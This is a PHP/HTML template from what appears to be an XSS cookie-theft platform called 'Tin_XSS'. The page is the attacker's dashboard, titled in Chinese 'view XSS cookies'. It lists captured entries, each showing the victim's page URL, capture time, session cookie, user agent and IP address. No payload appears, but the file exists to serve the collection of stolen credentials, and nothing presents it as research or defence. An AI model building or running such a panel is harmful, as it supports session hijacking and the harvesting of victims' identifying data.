<?php if (!defined('THINK_PATH')) exit();?><!doctype html>
<html class="no-js">
<head>  
<!--[if lte IE 9]>
<p class="browsehappy">你正在使用<strong>过时</strong>的浏览器，Amaze UI 暂不支持。 请 <a href="http://browsehappy.com/" target="_blank">升级浏览器</a>
  以获得更好的体验！</p>
<![endif]-->
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
  <meta name="renderer" content="webkit">
  <meta http-equiv="Cache-Control" content="no-siteapp" />
  <link rel="icon" type="image/png" href="assets/i/favicon.png">
  <link rel="apple-touch-icon-precomposed" href="/Theme/default/Public/assets/i/app-icon72x72@2x.png">
  <meta name="apple-mobile-web-app-title" content="Amaze UI" />
  <link rel="stylesheet" href="/Theme/default/Public/assets/css/amazeui.min.css">
  <link rel="stylesheet" href="/Theme/default/Public/assets/css/app.css">
  <script src="/Theme/default/Public/assets/js/app.js"></script>
<title>Tin_XSS</title>
<meta name="description" content="">
<meta name="keywords" content="">
</head> 
<style>
  .footer {
      background: #2d3e50;
    }

    .footer p {
      color: #7f8c8d;
      margin: 0;
      padding: 15px 0;
      text-align: center;
    }
</style>
<body>
<header class="am-topbar am-topbar-inverse">
  <h1 class="am-topbar-brand">
    <a href="/">TinxXSS</a>
  </h1>

  <button class="am-topbar-btn am-topbar-toggle am-btn am-btn-sm am-btn-success am-show-sm-only" data-am-collapse="{target: '#doc-topbar-collapse'}"><span class="am-sr-only">导航切换</span> <span class="am-icon-bars"></span></button>


<div class="am-topbar-right">
      <button class="am-btn am-btn-primary am-topbar-btn am-btn-sm" onclick="window.location.href='<?php echo U("Index/index/logut");?>'">退出</button>
    </div>
    <div class="am-topbar-right">
      <button class="am-btn am-btn-primary am-topbar-btn am-btn-sm"><?php echo ($hash['email']); ?></button>
    </div>
	  
  </div>
</header>	
<section class="am-panel am-panel-secondary">
  <header class="am-panel-hd">
    <h3 class="am-panel-title">查看XSS饼干</h3>
  </header>
  <div class="am-panel-bd">
  
  
<section data-am-widget="accordion" class="am-accordion am-accordion-gapped"
data-am-accordion='{  }'>
<?php if(is_array($getxss)): $i = 0; $__LIST__ = $getxss;if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$vo): $mod = ($i % 2 );++$i;?><dl class="am-accordion-item am-active">
    <dt class="am-accordion-title">URL:<?php echo ($vo['location']); ?></dt>
    <dd class="am-accordion-content am-collapse">时间:  <font color="#FF0000"><b> <?php echo ti($vo['time']);?></b></font>
      <br/>Cookie:  <font color="#FF0000"><b> <?php echo ($vo['cookie']); ?></b></font>
      <br/>网址:  <font color="#FF0000"><b> <?php echo ($vo['location']); ?></b></font>
      <br/>设备UA:  <font color="#FF0000"><b> <?php echo ($vo['ua']); ?></b></font>
	  <br/>IP:  <font color="#FF0000"><b> <?php echo ($vo['ip']); ?></b></font>
	  </dd>
  </dl><?php endforeach; endif; else: echo "" ;endif; ?>
</section>




  </div>
</section>

<footer class="footer">
  <div class="am-container">
    <p>2014 前端由<a href="http://www.yunshipei.com" target="_blank">AllMobilize, Inc.</a>支持  -核心由<a
        href="http://thinkphp.cn" target="_blank">ThinkPHP </a>引擎驱动. by the Cig</p>
  </div>
</footer>
<script src="/Theme/default/Public/assets/js/zepto.min.js?1.1.4"></script>
<script src="/Theme/default/Public/assets/js/amazeui.js"></script>

</body>
</html>